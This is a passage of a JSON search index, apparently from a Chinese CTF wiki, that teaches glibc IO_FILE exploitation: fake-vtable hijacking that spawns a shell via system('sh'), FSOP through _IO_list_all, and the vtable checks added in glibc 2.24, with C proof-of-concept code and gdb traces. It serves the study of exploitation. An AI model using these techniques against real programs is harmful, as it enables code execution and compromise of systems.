0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so", 
            "title": "\u4f2a\u9020 vtable \u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b"
        }, 
        {
            "location": "/pwn/io_file/fake-vtable-exploit/#vtable", 
            "text": "", 
            "title": "\u4f2a\u9020vtable\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b"
        }, 
        {
            "location": "/pwn/io_file/fake-vtable-exploit/#_1", 
            "text": "\u524d\u9762\u6211\u4eec\u4ecb\u7ecd\u4e86Linux\u4e2d\u6587\u4ef6\u6d41\u7684\u7279\u6027\uff08FILE\uff09\uff0c\u6211\u4eec\u53ef\u4ee5\u5f97\u77e5Linux\u4e2d\u7684\u4e00\u4e9b\u5e38\u89c1\u7684IO\u64cd\u4f5c\u51fd\u6570\u90fd\u9700\u8981\u7ecf\u8fc7FILE\u7ed3\u6784\u8fdb\u884c\u5904\u7406\u3002\u5c24\u5176\u662f_IO_FILE_plus\u7ed3\u6784\u4e2d\u5b58\u5728vtable\uff0c\u4e00\u4e9b\u51fd\u6570\u4f1a\u53d6\u51favtable\u4e2d\u7684\u6307\u9488\u8fdb\u884c\u8c03\u7528\u3002  \u56e0\u6b64\u4f2a\u9020vtable\u52ab\u6301\u7a0b\u5e8f\u6d41\u7a0b\u7684\u4e2d\u5fc3\u601d\u60f3\u5c31\u662f\u9488\u5bf9_IO_FILE_plus\u7684vtable\u52a8\u624b\u811a\uff0c\u901a\u8fc7\u628avtable\u6307\u5411\u6211\u4eec\u63a7\u5236\u7684\u5185\u5b58\uff0c\u5e76\u5728\u5176\u4e2d\u5e03\u7f6e\u51fd\u6570\u6307\u9488\u6765\u5b9e\u73b0\u3002  \u56e0\u6b64vtable\u52ab\u6301\u5206\u4e3a\u4e24\u79cd\uff0c\u4e00\u79cd\u662f\u76f4\u63a5\u6539\u5199vtable\u4e2d\u7684\u51fd\u6570\u6307\u9488\uff0c\u901a\u8fc7\u4efb\u610f\u5730\u5740\u5199\u5c31\u53ef\u4ee5\u5b9e\u73b0\u3002\u53e6\u4e00\u79cd\u662f\u8986\u76d6vtable\u7684\u6307\u9488\u6307\u5411\u6211\u4eec\u63a7\u5236\u7684\u5185\u5b58\uff0c\u7136\u540e\u5728\u5176\u4e2d\u5e03\u7f6e\u51fd\u6570\u6307\u9488\u3002", 
            "title": "\u7b80\u4ecb"
        }, 
        {
            "location": "/pwn/io_file/fake-vtable-exploit/#_2", 
            "text": "\u8fd9\u91cc\u6f14\u793a\u4e86\u4fee\u6539vtable\u4e2d\u7684\u6307\u9488\uff0c\u9996\u5148\u9700\u8981\u77e5\u9053_IO_FILE_plus\u4f4d\u4e8e\u54ea\u91cc\uff0c\u5bf9\u4e8efopen\u7684\u60c5\u51b5\u4e0b\u662f\u4f4d\u4e8e\u5806\u5185\u5b58\uff0c\u5bf9\u4e8estdin\\stdout\\stderr\u662f\u4f4d\u4e8elibc.so\u4e2d\u3002  int main(void)\n{\n    FILE *fp;\n    long long *vtable_ptr;\n    fp=fopen( 123.txt , rw );\n    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable\n\n    vtable_ptr[7]=0x41414141 //xsputn\n\n    printf( call 0x41414141 );\n}  \u6839\u636evtable\u5728_IO_FILE_plus\u7684\u504f\u79fb\u5f97\u5230vtable\u7684\u5730\u5740\uff0c\u572864\u4f4d\u7cfb\u7edf\u4e0b\u504f\u79fb\u662f0xd8\u3002\u4e4b\u540e\u9700\u8981\u641e\u6e05\u695a\u6b32\u52ab\u6301\u7684IO\u51fd\u6570\u4f1a\u8c03\u7528vtable\u4e2d\u7684\u54ea\u4e2a\u51fd\u6570\u3002\u5173\u4e8eIO\u51fd\u6570\u8c03\u7528vtable\u7684\u60c5\u51b5\u5df2\u7ecf\u5728FILE\u7ed3\u6784\u4ecb\u7ecd\u4e00\u8282\u7ed9\u51fa\u4e86\uff0c\u77e5\u9053\u4e86printf\u4f1a\u8c03\u7528vtable\u4e2d\u7684xsputn\uff0c\u5e76\u4e14xsputn\u7684\u662fvtable\u4e2d\u7b2c\u516b\u9879\u4e4b\u540e\u5c31\u53ef\u4ee5\u5199\u5165\u8fd9\u4e2a\u6307\u9488\u8fdb\u884c\u52ab\u6301\u3002  \u5e76\u4e14\u5728xsputn\u7b49vtable\u51fd\u6570\u8fdb\u884c\u8c03\u7528\u65f6\uff0c\u4f20\u5165\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5176\u5b9e\u662f\u5bf9\u5e94\u7684_IO_FILE_plus\u5730\u5740\u3002\u6bd4\u5982\u8fd9\u4f8b\u5b50\u8c03\u7528printf\uff0c\u4f20\u9012\u7ed9vtable\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u5c31\u662f_IO_2_1_stdout_\u7684\u5730\u5740\u3002  \u5229\u7528\u8fd9\u70b9\u53ef\u4ee5\u5b9e\u73b0\u7ed9\u52ab\u6301\u7684vtable\u51fd\u6570\u4f20\u53c3\uff0c\u6bd4\u5982  #define system_ptr 0x7ffff7a52390;\n\nint main(void)\n{\n    FILE *fp;\n    long long *vtable_ptr;\n    fp=fopen( 123.txt , rw );\n    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable\n\n    memcopy(fp, sh ,3);\n\n    vtable_ptr[7]=system_ptr //xsputn\n\n\n    fwrite( hi ,2,1,fp);\n}  \u4f46\u662f\u5728\u76ee\u524dlibc2.23\u7248\u672c\u4e0b\uff0c\u4f4d\u4e8elibc\u6570\u636e\u6bb5\u7684vtable\u662f\u4e0d\u53ef\u4ee5\u8fdb\u884c\u5199\u5165\u7684\u3002\u4e0d\u8fc7\uff0c\u901a\u8fc7\u5728\u53ef\u63a7\u7684\u5185\u5b58\u4e2d\u4f2a\u9020vtable\u7684\u65b9\u6cd5\u4f9d\u7136\u53ef\u4ee5\u5b9e\u73b0\u5229\u7528\u3002  #define system_ptr 0x7ffff7a52390;\n\nint main(void)\n{\n    FILE *fp;\n    long long *vtable_addr,*fake_vtable;\n\n    fp=fopen( 123.txt , rw );\n    fake_vtable=malloc(0x40);\n\n    vtable_addr=(long long *)((long long)fp+0xd8);     //vtable offset\n\n    vtable_addr[0]=(long long)fake_vtable;\n\n    memcpy(fp, sh ,3);\n\n    fake_vtable[7]=system_ptr; //xsputn\n\n    fwrite( hi ,2,1,fp);\n}  \u6211\u4eec\u9996\u5148\u5206\u914d\u4e00\u6b3e\u5185\u5b58\u6765\u5b58\u653e\u4f2a\u9020\u7684vtable\uff0c\u4e4b\u540e\u4fee\u6539_IO_FILE_plus\u7684vtable\u6307\u9488\u6307\u5411\u8fd9\u5757\u5185\u5b58\u3002\u56e0\u4e3avtable\u4e2d\u7684\u6307\u9488\u6211\u4eec\u653e\u7f6e\u7684\u662fsystem\u51fd\u6570\u7684\u5730\u5740\uff0c\u56e0\u6b64\u9700\u8981\u4f20\u9012\u53c2\u6570\"/bin/sh\"\u6216\"sh\"\u3002  \u56e0\u4e3avtable\u4e2d\u7684\u51fd\u6570\u8c03\u7528\u65f6\u4f1a\u628a\u5bf9\u5e94\u7684_IO_FILE_plus\u6307\u9488\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f20\u9012\uff0c\u56e0\u6b64\u8fd9\u91cc\u6211\u4eec\u628a\"sh\"\u5199\u5165_IO_FILE_plus\u5934\u90e8\u3002\u4e4b\u540e\u5bf9fwrite\u7684\u8c03\u7528\u5c31\u4f1a\u7ecf\u8fc7\u6211\u4eec\u4f2a\u9020\u7684vtable\u6267\u884csystem(\"sh\")\u3002  \u540c\u6837\uff0c\u5982\u679c\u7a0b\u5e8f\u4e2d\u4e0d\u5b58\u5728fopen\u7b49\u51fd\u6570\u521b\u5efa\u7684_IO_FILE\u65f6\uff0c\u4e5f\u53ef\u4ee5\u9009\u62e9stdin\\stdout\\stderr\u7b49\u4f4d\u4e8elibc.so\u4e2d\u7684_IO_FILE\uff0c\u8fd9\u4e9b\u6d41\u5728printf\\scanf\u7b49\u51fd\u6570\u4e2d\u5c31\u4f1a\u88ab\u4f7f\u7528\u5230\u3002\u5728libc2.23\u4e4b\u524d\uff0c\u8fd9\u4e9bvtable\u662f\u53ef\u4ee5\u5199\u5165\u5e76\u4e14\u4e0d\u5b58\u5728\u5176\u4ed6\u68c0\u6d4b\u7684\u3002  print  _IO_2_1_stdin_\n$2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0  _IO_2_1_stdin_ \n\n0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so\n0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so", 
            "title": "\u5b9e\u8df5"
        }, 
        {
            "location": "/pwn/io_file/fsop/", 
            "text": "FSOP\n\n\n\u4ecb\u7ecd\n\n\nFSOP\u662fFile Stream Oriented Programming\u7684\u7f29\u5199\uff0c\u6839\u636e\u524d\u9762\u5bf9FILE\u7684\u4ecb\u7ecd\u5f97\u77e5\u8fdb\u7a0b\u5185\u6240\u6709\u7684_IO_FILE\u7ed3\u6784\u4f1a\u4f7f\u7528_chain\u57df\u76f8\u4e92\u8fde\u63a5\u5f62\u6210\u4e00\u4e2a\u94fe\u8868\uff0c\u8fd9\u4e2a\u94fe\u8868\u7684\u5934\u90e8\u7531_IO_list_all\u7ef4\u62a4\u3002\n\n\nFSOP\u7684\u6838\u5fc3\u601d\u60f3\u5c31\u662f\u52ab\u6301_IO_list_all\u7684\u503c\u6765\u4f2a\u9020\u94fe\u8868\u548c\u5176\u4e2d\u7684_IO_FILE\u9879\uff0c\u4f46\u662f\u5355\u7eaf\u7684\u4f2a\u9020\u53ea\u662f\u6784\u9020\u4e86\u6570\u636e\u8fd8\u9700\u8981\u67d0\u79cd\u65b9\u6cd5\u8fdb\u884c\u89e6\u53d1\u3002FSOP\u9009\u62e9\u7684\u89e6\u53d1\u65b9\u6cd5\u662f\u8c03\u7528_IO_flush_all_lockp\uff0c\u8fd9\u4e2a\u51fd\u6570\u4f1a\u5237\u65b0_IO_list_all\u94fe\u8868\u4e2d\u6240\u6709\u9879\u7684\u6587\u4ef6\u6d41\uff0c\u76f8\u5f53\u4e8e\u5bf9\u6bcf\u4e2aFILE\u8c03\u7528fflush\uff0c\u4e5f\u5bf9\u5e94\u7740\u4f1a\u8c03\u7528_IO_FILE_plus.vtable\u4e2d\u7684_IO_overflow\u3002\n\n\nint\n_IO_flush_all_lockp (int do_lock)\n{\n  ...\n  fp = (_IO_FILE *) _IO_list_all;\n  while (fp != NULL)\n  {\n       ...\n       if (((fp-\n_mode \n= 0 \n fp-\n_IO_write_ptr \n fp-\n_IO_write_base))\n               \n _IO_OVERFLOW (fp, EOF) == EOF)\n           {\n               result = EOF;\n          }\n        ...\n  }\n}\n\n\n\n\n\n\n\n\n\n\u800c_IO_flush_all_lockp\u4e0d\u9700\u8981\u653b\u51fb\u8005\u624b\u52a8\u8c03\u7528\uff0c\u5728\u4e00\u4e9b\u60c5\u51b5\u4e0b\u8fd9\u4e2a\u51fd\u6570\u4f1a\u88ab\u7cfb\u7edf\u8c03\u7528\uff1a\n\n\n1.\u5f53libc\u6267\u884cabort\u6d41\u7a0b\u65f6\n\n\n2.\u5f53\u6267\u884cexit\u51fd\u6570\u65f6\n\n\n3.\u5f53\u6267\u884c\u6d41\u4ecemain\u51fd\u6570\u8fd4\u56de\u65f6\n\n\n\u793a\u4f8b\n\n\n\u68b3\u7406\u4e00\u4e0bFSOP\u5229\u7528\u7684\u6761\u4ef6\uff0c\u9996\u5148\u9700\u8981\u653b\u51fb\u8005\u83b7\u77e5libc.so\u57fa\u5740\uff0c\u56e0\u4e3a_IO_list_all\u662f\u4f5c\u4e3a\u5168\u5c40\u53d8\u91cf\u50a8\u5b58\u5728libc.so\u4e2d\u7684\uff0c\u4e0d\u6cc4\u6f0flibc\u57fa\u5740\u5c31\u4e0d\u80fd\u6539\u5199_IO_list_all\u3002\n\n\n\u4e4b\u540e\u9700\u8981\u7528\u4efb\u610f\u5730\u5740\u5199\u628a_IO_list_all\u7684\u5185\u5bb9\u6539\u4e3a\u6307\u5411\u6211\u4eec\u53ef\u63a7\u5185\u5b58\u7684\u6307\u9488\uff0c\n\n\n\u4e4b\u540e\u7684\u95ee\u9898\u662f\u5728\u53ef\u63a7\u5185\u5b58\u4e2d\u5e03\u7f6e\u4ec0\u4e48\u6570\u636e\uff0c\u6beb\u65e0\u7591\u95ee\u7684\u662f\u9700\u8981\u5e03\u7f6e\u4e00\u4e2a\u6211\u4eec\u7406\u60f3\u51fd\u6570\u7684vtable\u6307\u9488\u3002\u4f46\u662f\u4e3a\u4e86\u80fd\u591f\u8ba9\u6211\u4eec\u6784\u9020\u7684fake_FILE\u80fd\u591f\u6b63\u5e38\u5de5\u4f5c\uff0c\u8fd8\u9700\u8981\u5e03\u7f6e\u4e00\u4e9b\u5176\u4ed6\u6570\u636e\u3002\n\u8fd9\u91cc\u7684\u4f9d\u636e\u662f\u6211\u4eec\u524d\u9762\u7ed9\u51fa\u7684\n\n\nif (((fp-\n_mode \n= 0 \n fp-\n_IO_write_ptr \n fp-\n_IO_write_base))\n               \n _IO_OVERFLOW (fp, EOF) == EOF)\n           {\n               result = EOF;\n          }\n\n\n\n\n\u4e5f\u5c31\u662f\n\n\n\n\nfp-\n_mode \n= 0\n\n\nfp-\n_IO_write_ptr \n fp-\n_IO_write_base\n\n\n\n\n\u5728\u8fd9\u91cc\u901a\u8fc7\u4e00\u4e2a\u793a\u4f8b\u6765\u9a8c\u8bc1\u8fd9\u4e00\u70b9\uff0c\u9996\u5148\u6211\u4eec\u5206\u914d\u4e00\u5757\u5185\u5b58\u7528\u4e8e\u5b58\u653e\u4f2a\u9020\u7684vtable\u548c_IO_FILE_plus\u3002\n\u4e3a\u4e86\u7ed5\u8fc7\u9a8c\u8bc1\uff0c\u6211\u4eec\u63d0\u524d\u83b7\u5f97\u4e86_IO_write_ptr\u3001_IO_write_base\u3001_mode\u7b49\u6570\u636e\u57df\u7684\u504f\u79fb\uff0c\u8fd9\u6837\u53ef\u4ee5\u5728\u4f2a\u9020\u7684vtable\u4e2d\u6784\u9020\u76f8\u5e94\u7684\u6570\u636e\n\n\n#define _IO_list_all 0x7ffff7dd2520\n#define mode_offset 0xc0\n#define writeptr_offset 0x28\n#define writebase_offset 0x20\n#define vtable_offset 0xd8\n\nint main(void)\n{\n    void *ptr;\n    long long *list_all_ptr;\n\n    ptr=malloc(0x200);\n\n    *(long long*)((long long)ptr+mode_offset)=0x0;\n    *(long long*)((long long)ptr+writeptr_offset)=0x1;\n    *(long long*)((long long)ptr+writebase_offset)=0x0;\n    *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100);\n\n    *(long long*)((long long)ptr+0x100+24)=0x41414141;\n\n    list_all_ptr=(long long *)_IO_list_all;\n\n    list_all_ptr[0]=ptr;\n\n    exit(0);\n}\n\n\n\n\n\u6211\u4eec\u4f7f\u7528\u5206\u914d\u5185\u5b58\u7684\u524d0x100\u4e2a\u5b57\u8282\u4f5c\u4e3a_IO_FILE_plus\uff0c\u540e0x100\u4e2a\u5b57\u8282\u4f5c\u4e3avtable\uff0c\u5728vtable\u4e2d\u4f7f\u75280x41414141\u8fd9\u4e2a\u5730\u5740\u4f5c\u4e3a\u4f2a\u9020\u7684_IO_overflow\u6307\u9488\u3002\n\n\n\u4e4b\u540e\uff0c\u8986\u76d6\u4f4d\u4e8elibc\u4e2d\u7684\u5168\u5c40\u53d8\u91cf _IO_list_all\uff0c\u628a\u5b83\u6307\u5411\u6211\u4eec\u4f2a\u9020\u7684_IO_FILE_plus\u3002\n\n\n\u901a\u8fc7\u8c03\u7528exit\u51fd\u6570\uff0c\u7a0b\u5e8f\u4f1a\u6267\u884c _IO_flush_all_lockp\uff0c\u7ecf\u8fc7fflush\u83b7\u53d6_IO_list_all\u7684\u503c\u5e76\u53d6\u51fa\u4f5c\u4e3a_IO_FILE_plus\u8c03\u7528\u5176\u4e2d\u7684_IO_overflow\n\n\n---\n call _IO_overflow\n[#0] 0x7ffff7a89193 \u2192 Name: _IO_flush_all_lockp(do_lock=0x0)\n[#1] 0x7ffff7a8932a \u2192 Name: _IO_cleanup()\n[#2] 0x7ffff7a46f9b \u2192 Name: __run_exit_handlers(status=0x0, listp=\noptimized out\n, run_list_atexit=0x1)\n[#3] 0x7ffff7a47045 \u2192 Name: __GI_exit(status=\noptimized out\n)\n[#4] 0x4005ce \u2192 Name: main()", 
            "title": "FSOP"
        }, 
        {
            "location": "/pwn/io_file/fsop/#fsop", 
            "text": "", 
            "title": "FSOP"
        }, 
        {
            "location": "/pwn/io_file/fsop/#_1", 
            "text": "FSOP\u662fFile Stream Oriented Programming\u7684\u7f29\u5199\uff0c\u6839\u636e\u524d\u9762\u5bf9FILE\u7684\u4ecb\u7ecd\u5f97\u77e5\u8fdb\u7a0b\u5185\u6240\u6709\u7684_IO_FILE\u7ed3\u6784\u4f1a\u4f7f\u7528_chain\u57df\u76f8\u4e92\u8fde\u63a5\u5f62\u6210\u4e00\u4e2a\u94fe\u8868\uff0c\u8fd9\u4e2a\u94fe\u8868\u7684\u5934\u90e8\u7531_IO_list_all\u7ef4\u62a4\u3002  FSOP\u7684\u6838\u5fc3\u601d\u60f3\u5c31\u662f\u52ab\u6301_IO_list_all\u7684\u503c\u6765\u4f2a\u9020\u94fe\u8868\u548c\u5176\u4e2d\u7684_IO_FILE\u9879\uff0c\u4f46\u662f\u5355\u7eaf\u7684\u4f2a\u9020\u53ea\u662f\u6784\u9020\u4e86\u6570\u636e\u8fd8\u9700\u8981\u67d0\u79cd\u65b9\u6cd5\u8fdb\u884c\u89e6\u53d1\u3002FSOP\u9009\u62e9\u7684\u89e6\u53d1\u65b9\u6cd5\u662f\u8c03\u7528_IO_flush_all_lockp\uff0c\u8fd9\u4e2a\u51fd\u6570\u4f1a\u5237\u65b0_IO_list_all\u94fe\u8868\u4e2d\u6240\u6709\u9879\u7684\u6587\u4ef6\u6d41\uff0c\u76f8\u5f53\u4e8e\u5bf9\u6bcf\u4e2aFILE\u8c03\u7528fflush\uff0c\u4e5f\u5bf9\u5e94\u7740\u4f1a\u8c03\u7528_IO_FILE_plus.vtable\u4e2d\u7684_IO_overflow\u3002  int\n_IO_flush_all_lockp (int do_lock)\n{\n  ...\n  fp = (_IO_FILE *) _IO_list_all;\n  while (fp != NULL)\n  {\n       ...\n       if (((fp- _mode  = 0   fp- _IO_write_ptr   fp- _IO_write_base))\n                 _IO_OVERFLOW (fp, EOF) == EOF)\n           {\n               result = EOF;\n          }\n        ...\n  }\n}    \u800c_IO_flush_all_lockp\u4e0d\u9700\u8981\u653b\u51fb\u8005\u624b\u52a8\u8c03\u7528\uff0c\u5728\u4e00\u4e9b\u60c5\u51b5\u4e0b\u8fd9\u4e2a\u51fd\u6570\u4f1a\u88ab\u7cfb\u7edf\u8c03\u7528\uff1a  1.\u5f53libc\u6267\u884cabort\u6d41\u7a0b\u65f6  2.\u5f53\u6267\u884cexit\u51fd\u6570\u65f6  3.\u5f53\u6267\u884c\u6d41\u4ecemain\u51fd\u6570\u8fd4\u56de\u65f6", 
            "title": "\u4ecb\u7ecd"
        }, 
        {
            "location": "/pwn/io_file/fsop/#_2", 
            "text": "\u68b3\u7406\u4e00\u4e0bFSOP\u5229\u7528\u7684\u6761\u4ef6\uff0c\u9996\u5148\u9700\u8981\u653b\u51fb\u8005\u83b7\u77e5libc.so\u57fa\u5740\uff0c\u56e0\u4e3a_IO_list_all\u662f\u4f5c\u4e3a\u5168\u5c40\u53d8\u91cf\u50a8\u5b58\u5728libc.so\u4e2d\u7684\uff0c\u4e0d\u6cc4\u6f0flibc\u57fa\u5740\u5c31\u4e0d\u80fd\u6539\u5199_IO_list_all\u3002  \u4e4b\u540e\u9700\u8981\u7528\u4efb\u610f\u5730\u5740\u5199\u628a_IO_list_all\u7684\u5185\u5bb9\u6539\u4e3a\u6307\u5411\u6211\u4eec\u53ef\u63a7\u5185\u5b58\u7684\u6307\u9488\uff0c  \u4e4b\u540e\u7684\u95ee\u9898\u662f\u5728\u53ef\u63a7\u5185\u5b58\u4e2d\u5e03\u7f6e\u4ec0\u4e48\u6570\u636e\uff0c\u6beb\u65e0\u7591\u95ee\u7684\u662f\u9700\u8981\u5e03\u7f6e\u4e00\u4e2a\u6211\u4eec\u7406\u60f3\u51fd\u6570\u7684vtable\u6307\u9488\u3002\u4f46\u662f\u4e3a\u4e86\u80fd\u591f\u8ba9\u6211\u4eec\u6784\u9020\u7684fake_FILE\u80fd\u591f\u6b63\u5e38\u5de5\u4f5c\uff0c\u8fd8\u9700\u8981\u5e03\u7f6e\u4e00\u4e9b\u5176\u4ed6\u6570\u636e\u3002\n\u8fd9\u91cc\u7684\u4f9d\u636e\u662f\u6211\u4eec\u524d\u9762\u7ed9\u51fa\u7684  if (((fp- _mode  = 0   fp- _IO_write_ptr   fp- _IO_write_base))\n                 _IO_OVERFLOW (fp, EOF) == EOF)\n           {\n               result = EOF;\n          }  \u4e5f\u5c31\u662f   fp- _mode  = 0  fp- _IO_write_ptr   fp- _IO_write_base   \u5728\u8fd9\u91cc\u901a\u8fc7\u4e00\u4e2a\u793a\u4f8b\u6765\u9a8c\u8bc1\u8fd9\u4e00\u70b9\uff0c\u9996\u5148\u6211\u4eec\u5206\u914d\u4e00\u5757\u5185\u5b58\u7528\u4e8e\u5b58\u653e\u4f2a\u9020\u7684vtable\u548c_IO_FILE_plus\u3002\n\u4e3a\u4e86\u7ed5\u8fc7\u9a8c\u8bc1\uff0c\u6211\u4eec\u63d0\u524d\u83b7\u5f97\u4e86_IO_write_ptr\u3001_IO_write_base\u3001_mode\u7b49\u6570\u636e\u57df\u7684\u504f\u79fb\uff0c\u8fd9\u6837\u53ef\u4ee5\u5728\u4f2a\u9020\u7684vtable\u4e2d\u6784\u9020\u76f8\u5e94\u7684\u6570\u636e  #define _IO_list_all 0x7ffff7dd2520\n#define mode_offset 0xc0\n#define writeptr_offset 0x28\n#define writebase_offset 0x20\n#define vtable_offset 0xd8\n\nint main(void)\n{\n    void *ptr;\n    long long *list_all_ptr;\n\n    ptr=malloc(0x200);\n\n    *(long long*)((long long)ptr+mode_offset)=0x0;\n    *(long long*)((long long)ptr+writeptr_offset)=0x1;\n    *(long long*)((long long)ptr+writebase_offset)=0x0;\n    *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100);\n\n    *(long long*)((long long)ptr+0x100+24)=0x41414141;\n\n    list_all_ptr=(long long *)_IO_list_all;\n\n    list_all_ptr[0]=ptr;\n\n    exit(0);\n}  \u6211\u4eec\u4f7f\u7528\u5206\u914d\u5185\u5b58\u7684\u524d0x100\u4e2a\u5b57\u8282\u4f5c\u4e3a_IO_FILE_plus\uff0c\u540e0x100\u4e2a\u5b57\u8282\u4f5c\u4e3avtable\uff0c\u5728vtable\u4e2d\u4f7f\u75280x41414141\u8fd9\u4e2a\u5730\u5740\u4f5c\u4e3a\u4f2a\u9020\u7684_IO_overflow\u6307\u9488\u3002  \u4e4b\u540e\uff0c\u8986\u76d6\u4f4d\u4e8elibc\u4e2d\u7684\u5168\u5c40\u53d8\u91cf _IO_list_all\uff0c\u628a\u5b83\u6307\u5411\u6211\u4eec\u4f2a\u9020\u7684_IO_FILE_plus\u3002  \u901a\u8fc7\u8c03\u7528exit\u51fd\u6570\uff0c\u7a0b\u5e8f\u4f1a\u6267\u884c _IO_flush_all_lockp\uff0c\u7ecf\u8fc7fflush\u83b7\u53d6_IO_list_all\u7684\u503c\u5e76\u53d6\u51fa\u4f5c\u4e3a_IO_FILE_plus\u8c03\u7528\u5176\u4e2d\u7684_IO_overflow  ---  call _IO_overflow\n[#0] 0x7ffff7a89193 \u2192 Name: _IO_flush_all_lockp(do_lock=0x0)\n[#1] 0x7ffff7a8932a \u2192 Name: _IO_cleanup()\n[#2] 0x7ffff7a46f9b \u2192 Name: __run_exit_handlers(status=0x0, listp= optimized out , run_list_atexit=0x1)\n[#3] 0x7ffff7a47045 \u2192 Name: __GI_exit(status= optimized out )\n[#4] 0x4005ce \u2192 Name: main()", 
            "title": "\u793a\u4f8b"
        }, 
        {
            "location": "/pwn/io_file/exploit-in-libc2.24/", 
            "text": "\u65b0\u7248\u672clibc\u4e0bIO_FILE\u7684\u5229\u7528\n\n\n\u4ecb\u7ecd\n\n\n\u5728\u6700\u65b0\u7248\u672c\u7684glibc\u4e2d(2.24)\uff0c\u5168\u65b0\u52a0\u5165\u4e86\u9488\u5bf9IO_FILE_plus\u7684vtable\u52ab\u6301\u7684\u68c0\u6d4b\u63aa\u65bd\uff0cglibc\n\u4f1a\u5728\u8c03\u7528\u865a\u51fd\u6570\u4e4b\u524d\u9996\u5148\u68c0\u67e5vtable\u5730\u5740\u7684\u5408\u6cd5\u6027\u3002\n\n\n\u5982\u679cvtable\u662f\u975e\u6cd5\u7684\uff0c\u90a3\u4e48\u4f1a\u5f15\u53d1abort\u3002\n\n\n\u9996\u5148\u4f1a\u9a8c\u8bc1vtable\u662f\u5426\u4f4d\u4e8e_IO_vtable\u6bb5\u4e2d\uff0c\u5982\u679c\u6ee1\u8db3\u6761\u4ef6\u5c31\u6b63\u5e38\u6267\u884c\uff0c\u5426\u5219\u4f1a\u8c03\u7528_IO_vtable_check\u505a\u8fdb\u4e00\u6b65\u68c0\u67e5\u3002\n\n\n\u8fd9\u91cc\u7684\u68c0\u67e5\u4f7f\u5f97\u4ee5\u5f80\u4f7f\u7528vtable\u8fdb\u884c\u5229\u7528\u7684\u6280\u672f\u5f88\u96be\u5b9e\u73b0\n\n\n\u65b0\u7684\u5229\u7528\u6280\u672f\n\n\n\u5728vtable\u96be\u4ee5\u88ab\u5229\u7528\u4e4b\u540e\uff0c\u5229\u7528\u7684\u5173\u6ce8\u70b9\u4ecevtable\u8f6c\u79fb\u5230_IO_FILE\u7ed3\u6784\u5185\u90e8\u7684\u57df\u4e2d\u3002\n\u524d\u9762\u4ecb\u7ecd\u8fc7_IO_FILE\u5728\u4f7f\u7528\u6807\u51c6IO\u5e93\u65f6\u4f1a\u8fdb\u884c\u521b\u5efa\u5e76\u8d1f\u8d23\u7ef4\u62a4\u4e00\u4e9b\u76f8\u5173\u4fe1\u606f\uff0c\u5176\u4e2d\u6709\u4e00\u4e9b\u57df\u662f\u8868\u793a\u8c03\u7528\u8bf8\u5982fwrite\u3001fread\u7b49\u51fd\u6570\u65f6\u5199\u5165\u5730\u5740\u6216\u8bfb\u53d6\u5730\u5740\u7684\uff0c\u5982\u679c\u53ef\u4ee5\u63a7\u5236\u8fd9\u4e9b\u6570\u636e\u5c31\u53ef\u4ee5\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u6216\u4efb\u610f\u5730\u5740\u8bfb\u3002\n\n\nstruct _IO_FILE {\n  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */\n  /* The following pointers correspond to the C++ streambuf protocol. */\n  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */\n  char* _IO_read_ptr;   /* Current read pointer */\n  char* _IO_read_end;   /* End of get area. */\n  char* _IO_read_base;  /* Start of putback+get area. */\n  char* _IO_write_base; /* Start of put area. */\n  char* _IO_write_ptr;  /* Current put pointer. */\n  char* _IO_write_end;  /* End of put area. */\n  char* _IO_buf_base;   /* Start of reserve area. */\n  char* _IO_buf_end;    /* End of reserve area. */\n  /* The following fields are used to support backing up and undo. */\n  char *_IO_save_base; /* Pointer to start of non-current get area. */\n  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n  char *_IO_save_end; /* Pointer to end of non-current get area. */\n\n  struct _IO_marker *_markers;\n\n  struct _IO_FILE *_chain;\n\n  int _fileno;\n  int _flags2;\n  _IO_off_t _old_offset; /* This used to be _offset but it\ns too small.  */\n};\n\n\n\n\n\u56e0\u4e3a\u8fdb\u7a0b\u4e2d\u5305\u542b\u4e86\u7cfb\u7edf\u9ed8\u8ba4\u7684\u4e09\u4e2a\u6587\u4ef6\u6d41stdin\\stdout\\stderr\uff0c\u56e0\u6b64\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u4e0d\u9700\u8981\u8fdb\u7a0b\u4e2d\u5b58\u5728\u6587\u4ef6\u64cd\u4f5c\uff0c\u901a\u8fc7scanf\\printf\u4e00\u6837\u53ef\u4ee5\u8fdb\u884c\u5229\u7528\u3002\n\n\n\u5728_IO_FILE\u4e2d_IO_buf_base\u8868\u793a\u64cd\u4f5c\u7684\u8d77\u59cb\u5730\u5740\uff0c_IO_buf_end\u8868\u793a\u7ed3\u675f\u5730\u5740\uff0c\u901a\u8fc7\u63a7\u5236\u8fd9\u4e24\u4e2a\u6570\u636e\u53ef\u4ee5\u5b9e\u73b0\u63a7\u5236\u8bfb\u5199\u7684\u64cd\u4f5c\u3002\n\n\n\u793a\u4f8b\n\n\n\u7b80\u5355\u7684\u89c2\u5bdf\u4e00\u4e0b_IO_FILE\u5bf9\u4e8e\u8c03\u7528scanf\u7684\u4f5c\u7528\n\n\n#include \nstdio.h\n\n\nchar buf[100];\n\nint main()\n{\n char stack_buf[100];\n scanf(\n%s\n,stack_buf);\n 